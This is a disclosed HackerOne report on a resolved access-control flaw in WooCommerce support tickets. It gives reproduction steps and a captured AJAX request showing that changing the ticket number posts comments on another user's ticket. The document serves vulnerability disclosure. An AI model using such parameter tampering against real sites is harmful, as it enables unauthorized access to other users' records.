---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '91599'
original_report_id: '91599'
title: 'WooCommerce: Support Ticket indirect object reference'
weakness: Cross-Site Request Forgery (CSRF)
team_handle: automattic
created_at: '2015-10-01T10:14:32.410Z'
disclosed_at: '2016-09-02T11:04:21.597Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# WooCommerce: Support Ticket indirect object reference

## Metadata

- HackerOne Report ID: 91599
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: automattic
- Disclosed At: 2016-09-02T11:04:21.597Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi
there's no protection against Idor, so i can comment on anyone's Ticket.

___Reproduce Issue:____
1.Go Here: `https://www.woothemes.com/my-account/tickets/`
2.Create a new Ticket
suppose ticked id is : 340529
Comment something on 340529 Ticket, and capture that request In Burp suite.

here's the request:

`POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.woothemes.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
Referer: https://www.woothemes.com/my-account/tickets/?id=340529
Content-Length: 95
Cookie: cookies.....
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache`

`action=wc_zendesk_reply_ticket&security=e942b8f2d4&reply=HACKED!!!!!&number=___340529___&solved=false`


THATS MY TICKET, Now change ___number___ to victim's ticket id, and your comment will successfully added to victim's ticket.


Video Poc (unlisted): https://www.youtube.com/watch?v=bUEenDUoVfk&feature=youtu.be


thanks
paresh

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
